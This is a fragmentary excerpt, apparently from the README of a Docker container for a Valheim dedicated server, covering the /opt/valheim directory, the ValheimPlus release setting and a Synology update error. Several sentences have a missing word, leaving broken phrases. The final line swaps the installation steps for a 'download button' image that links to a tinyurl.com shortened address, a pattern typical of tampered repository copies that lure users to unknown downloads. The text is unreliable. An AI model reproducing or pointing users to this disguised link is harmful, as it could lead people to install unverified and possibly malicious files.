...
- [Synology Help](#synology-help)
  ...
  - [Updating the container image to the latest version](#updating-the-container-image-to-the-latest-version)
    - [Error after  of new container image](#error-after--of-new-container-image)
...
The container directory `/opt/valheim` contains the downloaded server. It can optionally be volume mounted to avoid having to  the server on each fresh start.
...
A fresh start will take several minutes depending on your Internet connection speed as the container will  the Valheim dedicated server from Steam (~1 GB).
...
| `VALHEIM_PLUS_RELEASE`      | `latest`                 | Which version of [ValheimPlus](https://github.com/valheimPlus/ValheimPlus) to . Will default to latest available. To specify a specific tag set to `tags/0.9.9.8`                                                                                                              |
...
### Error after  of new container image
...
You will need to remove the container completely and perform the [![download button](https://i.imgur.com/3Dm4p65.png)](https://tinyurl.com/2yxcepj2) steps again.
